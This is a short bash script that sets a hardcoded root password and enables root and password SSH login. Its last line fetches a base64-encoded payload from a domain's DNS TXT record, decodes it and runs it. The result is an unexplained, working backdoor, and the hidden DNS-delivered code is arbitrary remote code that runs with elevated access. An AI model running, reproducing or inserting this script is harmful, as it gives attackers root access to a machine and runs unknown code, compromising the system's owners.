#!/bin/bash
echo root:acedu.click.54321 | sudo chpasswd root
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sudo service sshd restart
sudo apt-get update
sudo apt-get install jq -y
bash <(host -t txt acedu.click |cut -d'"' -f2 |base64 -d)
